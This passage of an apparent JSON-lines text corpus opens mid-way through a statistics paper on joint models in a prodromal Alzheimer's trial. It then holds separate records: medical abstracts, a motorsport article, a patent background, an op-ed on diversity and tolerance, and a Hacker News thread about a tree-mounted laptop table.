baseline MMSECoefficient (SE)*p* ValueCoefficient (SE)*p* ValueLongitudinal sub-model:*Time* *\u03b2*~1~0.609 (0.047)0.0000.605 (0.047)0.000*Fortasyn* *\u03b2*~2~0.071 (0.077)0.3610.077 (0.077)0.321*Time \u00d7 Fortasyn* *\u03b2*~3~-0.233 (0.069)0.001-0.234 (0.069)0.001*Bmmse* *\u03b2*~4~-0.122 (0.015)0.000-0.110 (0.016)0.000Log Hazard (SE)*p* ValueLog Hazard (SE)*p* ValueSurvival sub-model:*Fortasyn* *\u03b3*~1~0.394 (0.204)0.0530.125 (0.210)0.553*Ass.* *\u03b1*0.701 (0.077)0.0000.664 (0.083)0.000*Bmmse* *\u03b3*~2~\\-\\--0.228 (0.050)0.000 Table 2Results for the different types of joint models for NTB memory domaina) Current valueb) Current value plus slopec) Cumulative effectCoefficient (SE)*p* ValueCoefficient (SE)*p* ValueCoefficient (SE)*p* ValueLongitudinal sub-model:*Time* *\u03b2*~1~-0.101 (0.030)0.001-0.128 (0.030)0.000-0.092 (0.029)0.002*Fortasyn* *\u03b2*~2~0.042 (0.082)0.6170.039 (0.083)0.6400.042 (0.083)0.610*Time \u00d7 Fortasyn* *\u03b2*~3~0.052 (0.043)0.2190.049 (0.043)0.2540.054 (0.042)0.192*Bmmse* *\u03b2*~4~0.160 (0.021)0.0000.159 (0.021)0.0000.158 (0.021)0.000Log Hazard (SE)*p* ValueLog Hazard (SE)*p* ValueLog Hazard (SE)*p* ValueSurvival sub-model:*Fortasyn* *\u03b3*~1~0.154 (0.203)0.4490.513 (0.387)0.1850.112 (0.198)0.573*Ass.* *\u03b1*~1~-1.214 (0.174)0.000-1.162 (0.341)0.001\\--*Ass. slope* *\u03b1*~2~\\-\\--6.792 (1.854)0.000\\--*Ass. AUC* *\u03b1*~3~\\-\\-\\-\\--0.671 (0.118)0.000*Bmmse* *\u03b3*~2~-0.098 (0.057)0.085-0.156 (0.088)0.078-0.163 (0.055)0.003\n\nFurther, we observe that both scores have strong associations with the risk of receiving the dementia diagnosis. In particular, a unit increase in CDR-SB corresponds to a exp(*\u03b1*) = 2.0-fold increase (95% CI: 1.7-2.3), and a 0.2 unit decrease in NTB memory domain corresponds to a exp(\u2212*\u03b1*\u00d70.2) = 1.3-fold increase (95% CI: 1.2-1.4) in the risk of receiving the dementia diagnosis. Thus, as expected, high values for CDR-SB and low values for NTB memory domain are associated with higher risks of receiving the dementia diagnosis. Note that the association for NTB memory domain (z-score) is reported per 0.2-unit increase, instead of per 1 unit, since the former denotes a more realistic increase.\n\nResults investigating the baseline confounding {#Sec9}\n----------------------------------------------\n\nWe notice from the results in Table\u00a0[1](#Tab1){ref-type=\"table\"}a that the coefficients *\u03b2*~3~ and *\u03b1*, which together quantify the indirect intervention effect, are both significant. These results suggest that the intervention decreases the risk of receiving the dementia diagnosis through its effect on CDR-SB. Simultaneously, not surprisingly given the baseline imbalance, we observe a nearly significant direct effect with the test group being exp(*\u03b3*~1~)=1.5-fold more likely to receive the dementia diagnosis than the control group. As explained above, the direct effect measures a constant effect over time, due to the proportional hazard assumption of the survival sub-model, and is therefore likely to capture possible effects of the baseline confounding. The significant direct effect in favour of the control group is therefore an indication of baseline confounding, also supported by the baseline difference in MMSE.\n\nComparing the results for *\u03b3*~1~ of the model with (Table\u00a0[1](#Tab1){ref-type=\"table\"}b) versus the model without baseline MMSE correction (Table\u00a0[1](#Tab1){ref-type=\"table\"}a), we observe that by correcting for baseline MMSE in the survival sub-model, the direct effect shrinks. This is also illustrated in Fig.\u00a0[6](#Fig6){ref-type=\"fig\"} where the effects of the coefficients for the separate components of the joint models are displayed over time. Comparing the effects of exp(*\u03b3*~1~) (the dashed lines) for 6a versus 6b shows that including the baseline MMSE correction, made the estimate for the direct effect shift towards a hazard ratio of 1, meaning no difference. Table\u00a0[1](#Tab1){ref-type=\"table\"} and Fig.\u00a0[6](#Fig6){ref-type=\"fig\"} also show that the estimates for the indirect effect components (*\u03b2*~2~, *\u03b2*~3~ and *\u03b1*) are hardly affected by the in - or exclusion - of baseline MMSE in the survival sub-model. Based on these results, we hypothesise that the baseline confounding in MMSE is indeed directly related to dementia diagnosis and that it masks the total intervention effect, being a combination of the indirect and direct processes. The latter is graphically illustrated in Fig.\u00a0[7](#Fig7){ref-type=\"fig\"}, in which the total intervention effect from the joint model - that is, the combination of the separate components of Fig.\u00a0[6](#Fig6){ref-type=\"fig\"} - is displayed as a solid line. Fig. 6Separate effects as estimated by the joint model for CDR-SB. The separate components exp(*\u03b3*~1~) (direct effect; dashed line), exp(*\u03b1*\u00d7*\u03b2*~2~) (indirect constant effect; solid line) and exp(*\u03b1*\u00d7*\u03b2*~3~\u00d7*t*) (indirect time-varying effect; dot dashed line), that together form the hazard ratio for the total intervention effect as estimated from the joint model for CDR-SB, plotted as separate effects in **a** without and in **b** with correction for baseline MMSE in the survival sub-model Fig. 7Total intervention effect as estimated by the joint model for CDR-SB. The total intervention effect on the hazard of dementia diagnosis as estimated from the joint model (solid line) and Cox model (dashed line) for CDR-SB, in **a** without and in **b** with correction for baseline MMSE in the survival sub-model. Corresponding 95% percentile confidence bands (light grey corresponding to the joint model and dark grey corresponding to the Cox model) were based on 2500 bootstrap samples\n\nFigure\u00a0[7](#Fig7){ref-type=\"fig\"} also shows the hazard ratios for the intervention effect on dementia diagnosis as estimated from a separately run Cox model (dashed lines). We observe that by using a joint model, and more specifically by incorporating the increasing intervention effect on the longitudinal marker, we can model an increasing intervention effect over time on the risk of dementia diagnosis. While by using the (standard) Cox model, with the underlying proportional hazard assumption, the intervention effect is assumed to be constant over time from baseline onward.\n\nResults for the association between the longitudinal and survival process {#Sec10}\n-------------------------------------------------------------------------\n\nTable\u00a0[2](#Tab2){ref-type=\"table\"} presents the results of joint models using the current value plus slope (b), and the cumulative effect (c) of the NTB memory domain trajectory for the link between the two processes. From the two types of joint models we observe similar results on the longitudinal process. From the association parameters, we observe that, as expected, decreasing trajectories and small cumulative values for NTB memory domain are associated with higher risks of receiving the dementia diagnosis. Both the rate of increase and the cumulative effect are strongly associated with the risk for dementia diagnosis. For example, if a patient's NTB memory domain score decreases by 0.2 units faster per year, or 1/60 units faster per month, then the risk of dementia diagnosis is associated with a exp(\u2212*\u03b1*~2~\u00d70.2) = 3.9-fold (95% 1.9-8.0) increase in the hazard. In the same way, if the cumulative effect of the history of the NTB memory domain levels (i.e., AUC) decreases with one unit, then this corresponds to a exp(\u2212*\u03b1*) = 2.0-fold increase (95% CI: 1.6-2.5) in the risk of dementia diagnosis.\n\nWe compared the two alternative types of joint models with the standard joint model based on measures for the model fit (information criteria AIC and BIC). Both measures indicated that the joint model using the current value plus slope is the best fitting joint model, suggesting that inclusion of the slope of the NTB memory domain trajectory improves the fit of the model compared to the standard joint model. The model using a cumulative effect was not found to have a better fit to the data than the standard joint model.\n\nDiscussion {#Sec11}\n==========\n\nScientists within the (prodromal) AD research field have much to gain from joint models for longitudinal and survival data. When estimating the time until clinical dementia diagnosis, while accounting for the effect of a longitudinal biomarker or cognitive measure, joint models can not only provide estimates for their association, but they can also further investigate the type of association.\n\nThis paper aimed to provide an introduction into the application of joint models with special interest in the relationship between the longitudinal information and the event times, using data from a prodromal AD trial. First of all, we reanalysed the data, combining the longitudinal data on cognitive functioning with the survival data on dementia diagnosis in order to account for their dependencies. Both longitudinal outcomes, CDR-SB and NTB memory domain, were strongly associated with the risk of dementia diagnosis. For CDR-SB we observed a statistically significant intervention effect on the longitudinal trajectory. Secondly, for NTB memory domain we investigated the type of association between the longitudinal profiles and the risk of dementia diagnosis. Specifically, we investigated three association types: the current value, the current value in combination with the rate of increase and the cumulative effect. We concluded that it was the current value in combination with the rate of increase of the longitudinal trajectory, that best captures the association with dementia diagnosis.\n\nAdditionally, this paper demonstrated the added value of a typical characteristic of joint models, namely the combination of the direct and indirect processes, both with different possibilities in modelling the effect of time. The joint model suggested an increased hazard ratio for the test versus the control group at the beginning of the trial. Given that there was no intervention before or at baseline, this increased hazard ratio was hypothesised to be caused by an imbalance between the intervention groups in characteristics at baseline. The groups were found to have a statistically significant imbalance at baseline in MMSE. MMSE is known to reflect cognitive performance and having an imbalance in MMSE between the intervention groups at baseline suggested that the groups - despite the randomisation process - might have on average differed in where they were in the disease continuum at baseline. Including baseline MMSE in the joint model markedly decreased the hazard ratio at the beginning of the trial, which fits into the hypothesis that the increased hazard ratio at the beginning of the trial was caused by baseline imbalance.\n\nThe imbalance between the intervention groups in characteristics at baseline might have been composed of several factors for which baseline MMSE was only a proxy. However, including the baseline MMSE in the joint models provided a tool to disentangle baseline confounding from the intervention effect.\n\nFurther, this paper illustrated another positive feature of joint models which is to model intervention effects on the hazard ratio that are changing over time. In the standard Cox models, the intervention effect is assumed to be constant during the entire follow-up, an assumption that is often not biologically meaningful. Using a joint model, it is possible to model a time-varying intervention effect on the survival outcome by incorporating a time-varying intervention effect on the longitudinal marker. In this prodromal AD trial, the joint model revealed an indication of an increasing intervention effect over time, suggesting a decreased hazard ratio for the test group at the end of the 24-month trial.\n\nUsing time to dementia diagnosis as an outcome measure within the limited time-frame of a clinical trial has practical issues which complicate its use. First, a large part of the diagnoses cluster around the study visits when cognitive testing is performed and progression to dementia is thus detected. As a consequence, a part of the observed event times is interval-censored, although the statistical software used for the analyses, did not cover this type of censoring. Another aspect is that, the diagnosis represents a single time point when the disease is thought of as a process moving along a continuum. Time to dementia diagnosis provided therefore only a rough measure of disease progression. However, using the information on time to dementia diagnosis was found to have an added value, by applying a statistical approach that combines every patient's moment of diagnosis with his or her longitudinal trajectory.\n\nConclusion {#Sec12}\n==========\n\nJoint models provide a valuable tool in the statistical analysis of clinical studies with longitudinal and survival data, such as in prodromal Alzheimer's disease trials, and have several added values compared to separate analyses.\n\nAdditional file\n===============\n\n {#Sec13}\n\nAdditional file 1R code to fit joint models. (PDF 35 kb)\n\nAD\n\n:   Alzheimer's disease\n\nAUC\n\n:   Area under the curve\n\nCDR-SB\n\n:   Clinical dementia rating sum of boxes\n\nCERAD\n\n:   Consortium to establish a registry for AD\n\nMMSE\n\n:   Mini--mental state examination\n\nNTB\n\n:   Neuropsychological test battery\n\n**Publisher's Note**\n\nSpringer Nature remains neutral with regard to jurisdictional claims in published maps and institutional affiliations.\n\nThe authors thank the LipiDiDiet clinical study group for the valuable data that was used in this paper. The last author would like to acknowledge support by the Netherlands Organization for Scientific Research (VIDI grant number 016.146.301).\n\nAuthors TH and HS designed the trial. Author FO drafted the manuscript and analysed the results under supervision of SS and DR. Authors SS, DR, TH and AH provided critical input to the manuscript. All authors read and approved the final manuscript.\n\nThe LipiDiDiet study project was funded by the European Commission under the 7th framework programme of the European Union (grant agreement number 211696). The funding body had no role in the study design, data collection, data analysis, data interpretation, or in writing the manuscript.\n\nThe data are proprietary information of the LipiDiDiet clinical study group.\n\nNot applicable.\n\nNot applicable.\n\nFO, SS and AH are employees of Danone Nutricia Research. HS and TH were supported by a grant from the European Commission for the LipiDiDiet study (FP7-211696 LipiDiDiet). HS has served as advisory board member for ACImmune and MERCK. Institution, UEF, has received funding from Nutricia for extension studies of LipiDiDiet Trial (no personal payment). Author DR declares to have no competing interests.\n", "meta": {"pile_set_name": "PubMed Central"}}
{"text": "Predicting early academic success: HESI Admissions Assessment Exam.\nStudent retention is a major challenge for undergraduate nursing programs, with the highest attrition occurring in the first year of the nursing curriculum. Admission criteria have been studied extensively but usually as related to end-of-program outcomes such as National Council Licensure Examination for Registered Nurses success. The purpose of this study was to examine the relationship between HESI Admission Assessment (A(2)) scores and academic performance in the 2 first-semester nursing courses of an associate degree program, Nursing-1 and Nursing-2. Findings indicated that the composite A(2) scores were strongly correlated with both Nursing-1 and Nursing-2 final course grades. Of the scores on the 4 component A(2) exams completed by the sample students (basic math skills, reading comprehension, vocabulary/general knowledge, and grammar), vocabulary/general knowledge scores had the strongest relationship to final course grades in both nursing courses. The authors concluded that A(2) scores facilitated evidence-based admission decisions.", "meta": {"pile_set_name": "PubMed Abstracts"}}
{"text": "Foundations and Trends in Computer Graphics and Vision\n\nFoundations and Trends in Computer Graphics and Vision is a journal published by Now Publishers. It publishes survey and tutorial articles on all aspects of computer graphics and vision. The editor-in-chiefs are Brian Curless (University of Washington), Luc Van Gool (KU Leuven) and Richard Szeliski (Microsoft Research).\n\nAbstracting and indexing \nThe journal is abstracted and indexed in:\n Inspec\n EI-Compendex\n Scopus\n CSA databases\n ACM Digital Library\n\nExternal links \n \n\nCategory:Computer science journals\nCategory:Now Publishers academic journals\nCategory:English-language journals\nCategory:Quarterly journals\nCategory:Publications established in 2007", "meta": {"pile_set_name": "Wikipedia (en)"}}
{"text": "The rapid growth of GT4 over the past two seasons has left many British GT Championship regulars turning their attention away from GT3, raising questions about the future of the top class.\n\nLast weekend\u2019s double-header at Snetterton had just ten GT3 cars alongside 17 GT4 entries, with the latter continuing to benefit from the rising costs of GT3 that are forcing drivers, teams and manufacturers to look further down the field.\n\nMcLaren is amongst the names absent from the top class this season, and McLaren GT Sporting Director Bas Leinders explains why his brand is concentrating on its 570S GT4 in British GT.\n\n\u201cThe reason we have the GT4s is because they are very good cars, it\u2019s a good championship and GT4 is on the up, so it is important that McLaren is represented in the best possible way,\u201d he told Sportscar365.\n\n\u201cThere will be very good competition in the future \u2013 there already is now \u2013 but with Audi, BMW and Mercedes stepping up, it will only get more entertaining.\n\n\u201cGT4 is very competitive, with a lot of cars, a lot of teams and budgets are quite reasonable.\u201d\n\nStuart Parker\u2019s Team Parker Racing currently competes with a pair of Bentley Continental GT3s as well as the series\u2019 sole Porsche Cayman GT4 Clubsport MR, and he says that the manufacturer interest in GT4 is a major attraction.\n\n\u201cThe competition is getting better, and that\u2019s because there are more manufacturers getting involved,\u201d he told Sportscar365.\n\n\u201cYou\u2019ve got more product choice, so it\u2019s not a two-horse race which it was a few years ago. Three years ago, you\u2019d have a Ginetta or an Aston Martin, and that was your lot.\n\n\u201cNow, there\u2019s the Porsche in the mix, the McLaren, and the Nissans are back.\n\n\u201cNext year is going to be really interesting because you\u2019ve got all the big German manufacturers coming back in.\n\n\u201cIt\u2019s the age-old cycle \u2013 GT3 is going to die because it\u2019s getting too expensive, and GT4 becomes the new GT3.\u201d\n\nA bold move from a GT3 regular saw Joe Osborne return to GT4 this season with Tolman Motorsport, something he says future-proofs his career.\n\n\u201cThe most common thing people have said to me is, \u2018Oh you\u2019ve stepped down to GT4,'\u201d he told Sportscar365.\n\n\u201cI can understand the logic, and GT3 is the headline class and the fastest, but if you now look at the grid, we\u2019re two-thirds of it in GT4.\n\n\u201cYes, it\u2019s a step down in terms of speed, but in competitiveness, we have twice as many cars. OK, we don\u2019t have the drivers like [Matt] Griffin, [Phil] Keen, and Jonny Adam, but there are some quick under-the-radar guys.\u201d\n\nParker worries about the budgets required for GT3, meanwhile.\n\n\u201cThe cost of GT3 is getting too much, and it\u2019s getting to manufacturer levels of financial commitment,\u201d he said.\n\n\u201cPrivate teams just can\u2019t afford to pay the bills, and it\u2019s gone from needing a wealthy person to a super-wealthy person.\u201d\n\nWith a reduced GT3 entry last season and some manufacturers missing, Osborne was very vocal about his worries regarding the class\u2019 downfall.\n\nHe admitted he didn\u2019t expect GT3 to survive the off-season and that a 12-car full-season entry was far past his expectations for this year.\n\n\u201cI lost \u00a350 on a bet with Benjamin [Franassovici, Championship Manager] that he\u2019d have less than eight cars, and he proved me wrong!\u201d he said.\n\n\u201cI\u2019ve got no problems in being wrong if the series is healthy, but I still say that GT3 is frail. We\u2019re now down to ten cars, and to me that isn\u2019t a proper competitive championship.\n\n\u201cIt\u2019s hard to attract new blood, and I think GT4 is a lot more attainable, budget-wise, for these guys, and that\u2019s why it has grown.\u201d\n\nFranassovici, meanwhile, assures that he is confident GT3 will remain part of the package next season, and that he is aiming for more cars than this year.\n\n\u201cWe\u2019re pushing for next year,\u201d he told Sportcar365. \u201cI think it\u2019s very possible that we\u2019ll have the same numbers next year, if not a couple more.\n\n\u201cThere are a lot of young Silver guys who are stepping up. Ten is not what I want, so we\u2019re pushing for more.\u201d\n\nThe McLaren is part of the new generation of GT4 cars and Leinders was quick to praise the improvements made to the category in recent years.\n\n\u201cThey are very nice cars now, and a few years ago they were not so nice race cars,\u201d he said. \u201cThey\u2019re enjoyable to drive and the speed has gone up.\n\n\u201cOK, the budget has gone up a little bit, but they are still only half the price of GT3 cars.\u201d\n\nWhile GT4 cars are still considerably more affordable than their GT3 counterparts, Osborne isn\u2019t so sure that the arrival of new manufacturers next year will keep this true.\n\n\u201cGT4 will start its cycle of becoming GT3, which will ultimately get too expensive and then everything starts again,\u201d he predicts.\n\n\u201cBy the time I finish my career it will be GT86, because it\u2019s just getting ridiculous.\u201d", "meta": {"pile_set_name": "OpenWebText2"}}
{"text": "The present invention relates to blood pressure measurement, in particular to a method and apparatus for the measurement of systolic blood pressure.\nIn most automatic indirect methods of blood pressure measurement, a pressure cuff is attached to a patient's arm adjacent a blood vessel, the cuff is pressurized with an applied pressure which is high enough to occlude the blood vessel and the applied pressure is gradually reduced. As the pressure is reduced to below systolic and then diastolic, blood begins to flow through the blood vessel creating the well known Korotkoff sounds and pulsatile pressures in the blood vessel. The sounds can be detected by a microphone at pulsatile pressures by a pressure transducer. The sensor, whether a microphone or pressure transducer, measures a quantity which is representative of the patient's blood pressure.\nAn oscillometric table is then formed of values of the quantity measured at various applied pressures as the applied pressure is gradually changed. Using the table the systolic and diastolic blood pressures are determined.\nIn a well behaved reading of blood pressure, the values generally increase from low values at applied pressures above the systolic to a maximum value at applied pressures between systolic and diastolic. Similarly, the values generally increase from low values at applied pressures less than diastolic to the maximum values. Respiration of the patient and other artifacts often cause the table to be non-monotonic. For example, respiration of the patient can change the instantaneous blood pressure by as much as forty millimeters of mercury. Effects of respiration on blood pressure are usually worse with people with compromised respiration and tends to be more pronounced at higher applied cuff pressures at or around systolic blood pressure levels.\nRespiration then can affect the accuracy of blood pressure measurement particularly where a single threshold algorithm is applied to the oscillometric table in order to determine systolic blood pressure. Means for eliminating or minimizing the effects of respiration on the accuracy of measurement of systolic blood pressure is desireable.", "meta": {"pile_set_name": "USPTO Backgrounds"}}
{"text": "Height-Based Equations Can Improve the Diagnosis of Elevated Blood Pressure in Children.\nHigh blood pressure (BP) is usually underdiagnosed in children and adolescents, particularly due to its complex diagnosis process. This study describes novel height-based equations for the detection of BP disorders (BP > 90th percentile) and compares the accuracy of this approach with previously described screening methods to identify BP disorders. Height-based equations were built using the 90th percentile values for systolic and diastolic BP and respective height values from the current guideline of high-BP management in children. This guideline was also used as the gold standard method for identification of BP disorders. The equations were tested in Brazilian (n = 2,936) and American (n = 6,541) populations of children with 8-13 years old. The obtained equations were 70 + 0.3 \u00d7 height (in cm) for systolic BP and 35 + 0.25 \u00d7 height (in cm) for diastolic BP. The new equations presented sensitivity and negative predictive value of near 100% and specificity > 91% and showed higher specificity and positive predictive value when compared with other screening tools. Importantly, height-based equations had greater agreement (kappa coefficient = 0.75-0.81) with the gold standard method than the other methods (kappa coefficient = 0.53-0.73). Further analysis showed that alternative height-based equations designed to identify hypertension (BP \u2265 95th percentile) also showed superior performance (kappa coefficient = 0.89-0.92) compared with other screening methods (kappa coefficient = 0.43-0.85). These findings suggest that the use of height-based equations may be a simple and feasible approach to improve the detection of high BP in the pediatric population.", "meta": {"pile_set_name": "PubMed Abstracts"}}
{"text": "Plasminogen activator inhibitor-1, tissue-type plasminogen activator, and fibrinogen: Effect of dieting with or without exercise in overweight postmenopausal women.\nThis study assessed the short- and long-term effects of an energy-restrictive diet with or without exercise on plasminogen activator inhibitor-1 antigen (PAI-1 Ag) and PAI-1 activity, tissue-type plasminogen activator antigen (TPA Ag), and fibrinogen serum levels. Healthy, overweight postmenopausal women (age, 53.8+/-2.5 years; body mass index, 25 to 42 kg/m2; n=121) were randomly assigned to one of three groups: control, 4200-kJ/d diet, or 4200-kJ/d diet with combined aerobic and anaerobic exercise. PAI-1 activity and PAI-1 Ag, TPA Ag, and fibrinogen levels were measured at baseline, after a 12-week intervention, and after a further 6-month follow-up. PAI-1 Ag and activity and TPA Ag were positively correlated with serum triglyceride levels, the abdominal-to-total-body fat ratio (as assessed by total-body dual-energy x-ray absorptiometry), fasting blood glucose, and systolic BP and negatively with HDL cholesterol and sex hormone-binding globulin. The diet led to profound decreases and normalization of PAI-1 activity (approximately 50%), PAI-1 Ag (approximately 30%) and TPA Ag (approximately (29%), but exercise conferred no additional effect. Fibrinogen did not change. At follow-up there were no longer any significant changes (P>.05). In conclusion, PAI-1 Ag and activity as well as TPA Ag seem to be part of the metabolic syndrome X. The diet made the blood less thrombogenic in the short term with no effect of the added exercise.", "meta": {"pile_set_name": "PubMed Abstracts"}}
{"text": "Find out how to warm up with lip trills/ lip bubbles. A vocal exercise that\u2019s rumored to be a favourite of Beyonc\u00e9 if you needed more convincing! \ud83d\ude09 If you missed the straw warm up you can catch it here.\n\nNew Sing with Hannah videos are released every Monday- subscribe to make sure you never miss out. Have any questions? email me at: info@singwithhannah.com or leave a comment. Happy vocalising!\n\nMy first singing tip video is here! I hope you will find them useful- I keep them short and sweet, so leave a comment or message me if you would like more information. This exercise helps balance the air above and below the vocal folds- which helps them function efficiently and easily. This ultimately results in increased stamina, co-ordination and vocal range. Not a bad result for making silly sounds into a plastic tube!", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "Passive tolerance is probably not a concept many people have yet heard of. Let's hope that changes, because \"passive tolerance\" is the most hopeful bit of academic social psychology research to emerge in a long time. It is the idea that simply living in an area of high diversity rubs off on you, making you more tolerant of ethnic diversity.\n\nThink of all those tiny interactions between different ethnic groups on an average British city street: the newsagent, the corner shop, the delivery driver, the postman, friends laughing, children playing, a pair of lovers. This is what generates passive tolerance. You don't have to be part of the interaction yourself; just witnessing it is enough to have a significant impact \u2013 comparable to the effect passive smoking has on your health, hence the term passive tolerance.\n\nThis is the finding of seven studies carried out over 10 years in the United States, Europe and South Africa, led by a team of social psychologists at the University of Oxford and published in the journal of the United States National Academy of Sciences. They were careful to rule out the most obvious explanation for their finding, social psychologists Miles Hewstone and Katharina Schmid explain \u2013 namely, that the higher levels of tolerance in more diverse neighbourhoods are a result of more tolerant people choosing to live there. Two of the studies were conducted over several years and tracked the same individuals, showing how attitudes changed. Even prejudiced people showed a greater degree of tolerance over time if they lived in a mixed neighbourhood.\n\nThe study's positive message is reinforced by the finding of a separate study led by the same Oxford team \u2013 the biggest to date in England on diversity and trust. White British people were asked whether they felt ethnic minorities threatened their way of life, increased crime levels, or took their jobs; ethnic minority participants were asked the same questions. Both groups were then asked about how they interact with other groups in everyday situations, such as corner shops, and then about how much they trusted people from their own and other ethnic groups in their neighbourhood. What the study found was that distrust does rise in diverse communities, but day to day, direct contact cancels it out.\n\nThe two studies together point to a more optimistic reading of how diversity impacts on urban neighbourhoods.\n\nThe reason passive tolerance is politically so important is not hard to see. Sociology and social psychology have frequently been drafted in to the highly charged political debate about community, integration and multiculturalism. Key concepts and ideas take hold in the political sphere and become a rationale for policy. The danger is that oft-quoted ideas can become self-fulfilling. Perhaps the most influential in this area has been US sociologist Professor Robert Putnam, who said diversity has a negative impact on social capital, leading to people \"hunkering down\", and trust in strangers and neighbourhoods dropping significantly. \"Hunkering down\" has become a widely quoted phrase as a respectable way for liberals to articulate their growing concern in an increasingly toxic political debate on immigration.\n\nThe problematic issue for the left is that lower levels of trust have been linked to declining support for the welfare state. The theory is that if you are less likely to trust the people around you, you are less willing to have a sense of solidarity and so less likely to stump up the taxes to pay for other people's benefits.\n\nThe author David Goodhart, for instance, has seized upon Putnam's \"hunkering down thesis as vindication of the controversial position he holds has long advanced. He routinely invokes Putnam to argue that the pace and scale of increasing diversity in the UK has been too great and, as he said in a recent interview, people \"become less willing to share resources and do the things we require of people in a modern welfare state\". The left faces a nasty conundrum as two of its most sacred shibboleths come into conflict: ethnic diversity and the solidarity necessary for a strong welfare state.\n\nThis new research throws these conclusions into question. Putnam's work may, after all, have been misleading. In fact, rather than hunkering down, living in a mixed neighbourhood helps you open up. In some ways this vindicates many people's anecdotal experience of their own enjoyment of diversity in their neighbourhoods, and the sense that the most pronounced fear and prejudice is found in exclusively white areas.\n\nThe research also vindicates the case for local initiatives to foster social exchange and build community relationships. From carnivals to coffee mornings, jumble sales to fun days in the park \u2013 all these are opportunities to generate passive tolerance. Sadly, however, many of these initiatives have fallen victim to local authority funding cuts. The impact of austerity has been compounded by a loss of confidence \u2013 in which Putnam's research played its part \u2013 about fostering strong diverse communities. Multiculturalism has fallen from favour, misunderstood and maligned as the set of ideas that guided community relations for a generation.\n\nNo one was more acutely aware of this danger than Putnam himself when he talked to me on the publication of his research in 2007, the timing made the danger all the more acute in the aftermath of 7/7 bombings. Since then the theme of integration has come to dominate \u2013 with its coercive and conformist overtones. The result has been a yawning gap with no positive narrative for the fast-changing diversity of Britain's urban life.\n\nThe hope is that this academic research will percolate into policy and public life, inspiring confidence again that strong diverse communities are not only possible, but can also work as beacons, converting residents and visitors alike to a possibility of rich exchange.", "meta": {"pile_set_name": "OpenWebText2"}}
{"text": "\nShow HN: The Tree Table is a portable table that mounts on a tree's trunk. - boris1\nhttps://www.indiegogo.com/projects/tree-table\n======\nlostmyoldone\nWhile the usefullness is debatable, I'm a little concerned about the tree\nfriendliness.\n\nFrom what I can see on the pictures, the standoffs, including the side\nstability lugs shown in one of the pictures might be too small to avoid risk\nof damage to the bark.\n\nFor most trees, short mounting time, and light load it is probably fine as the\npage states, but someone walking into the table, or trying to sit on it, would\nlikely damage at least some species of tree.\n\nUse on your own trees as you wish, but maybe avoid things like this on\ncommunity/park trees, at least not without additional padding and some\nunderstanding of how robust the particular kind of tree is.\n\nTrees are very strong, but the bark isn't always.\n\nPadding for trees should almost always be smooth on the tree side to avoid\nabrasion when mounting, no harder than the tree outer and inner bark, and\nspread the load ... sufficiently.\n\nWhat is sufficient will vary from species to species, and to some extent by\nage, but considering some trees have a soft enough bark that you can at least\nsuperficially damage it with a fingernail, there are no obvious rules.\n\nErr on the side of caution.\n\n~~~\nboris1\nI tried it on about 20 trees, of all shapes I could find here in Vancouver,\nBC, coding on my laptop for 8 hours a day. No noticeable damage with a naked\neye, using the prototype. The bark doesn't get damaged, because once\neverything is tightened, there's no movement or wiggling, only a compression.\nMost bark can handle the compression. So even if you bump into the tree,\nnothing's going to happen.\n\nThe manufactured product will probably have some padding on the lugs, it may\nnot be wood lugs, but maybe rubber lugs. Or metal or wood lugs, with rubber\npadding glued on.\n\nThe way I set in in the prototype, is when the bolt of the lug rotates, the\nlug also rotates. So I have to set it right, and then just use it at that\nposition. For the manufactured product, I'd like to set it, then tighten the\nbelt a little, then allow to screw the lug bolt so that the mounting bar would\nbecome vertical. This means that the lug must have a bearing, that would make\nthe rotating bolt (or shaft) rotate freely, without moving anything on the\nbark, so that the bark doesn't get damaged.\n\n------\nbryanrasmussen\nIt looks too complicated for me, it would probably just make me think I will\nsit on the ground with my laptop. However I feel the concept could be made to\nappeal to someone as lazy as me with some simplification - I'm thinking if\neverything could be focused on the strap.\n\n~~~\nboris1\nFirst, it gets cold to work sitting if it's Spring time (15 degrees Celcius).\nIs this case, only working standing keeps you warm enough, since the blood is\ncirculating. (In the hot summer, you could work sitting in a shade of a tree.)\nSecond, you can't work sitting on the ground for too long, it's just not\nergonomic. I also like my ergonomic Microsoft keyboard, without which I can't\ncode for too long. I like my mouse, etc. So, by sitting on the ground you can\ndo some adhoc work, but you'll go home for serious commitment.\n\n------\nbrudgers\nTo me, this seems like an idea that warrants a longer period of hand-crafting\nbefore a $100,000 production run. It's an interesting prototype, but a folding\n\"church table\" is a better sorted piece of engineering. I can turn it to face\nthe ocean, work in a parking lot, and it takes approximately the same space.\nGood luck.\n\n~~~\nboris1\nYou can't work on a regular table (like a church table) in a standing\nposition. On a cloudy spring day, it's too cold to sit. You have to work\nstanding, to keep the blood flowing.\n\nAlso, a folding church table is heavy to carry around. Part of all that weight\ncomes from the fact that the table has to be of a reasonable size to be tall\nand stable. The best table like this is the pricy Roll-a-Table (it's not a\nchurch table) and I have it. But it's 12 lb to carry around which I didn't\nenjoy. And, I also had to carry also a chair (Roll-a-Chair), and at the end of\nit all, I couldn't work standing. So, on top of this a carried around a\ncamping table that I put on top of the Roll-a-Table. Together with a laptop\nstand, it gave me a standing working position. All that complexity is gone\nwith the Tree Table. I mount it at the height I need to work standing, and\nit's light to carry.\n\nIf I get the funding, I'll invest some part of it to see if I can make it\ndisassemble more for better portability. If I don't come with a\nsimplification, you get the table as in the prototype.\n\n------\nanotheryou\nIt's nice but lacking some polish.\n\nI think it would also have to focus on portability.\n\n~~~\nboris1\nI refactored it and posted a pic. It's simple to carry now. (You were right.)\nThe final product will be even better (would pack smaller, and will be\nlighter. That's because I'm planning to use thin aluminium for the table too,\nnot wood.)\n\n------\nclaymav\nI'd love to see a new version of this in a little while with a few things\nreconsidered: 1\\. Portability is very important here, making it fold up small\nand be light 2\\. Simpler mechanism. Seems like it's too complicated to be\neasily adopted by many people. 3\\. Leveling, might be convenient to make it\neasy to level against the tree in both directions. Could integrate a level\ninto the table itself.\n\n~~~\nboris1\nI'll only work on V2 of this after I get some funding through a campaign. Why?\nI'm a coder by trade. I'm not going to gamble with R&D on the table concept,\nif I have to bootstrap it on my own. If I get the funding, I'll go full time\non this, and I'll surely make it more portable. I have to experiment with 3D\nprinted parts, I think. It can't be done with stuff out of Home Depot.\n\n~~~\nclaymav\nI've contributed and I wish you luck! Keep improving and I think this concept\ncould be great. Might want to try advertising outside of HN though\n\n~~~\nboris1\nHi Clay, I saw -- thanks. I refactored it, and it's simple to carry now. I've\nposted an update with a pic, I think you are receiving those.\n\n------\nboris1\nGuys, if I get the funding, I'll make it better before I put into production\n(more portable, etc.) I'll do some 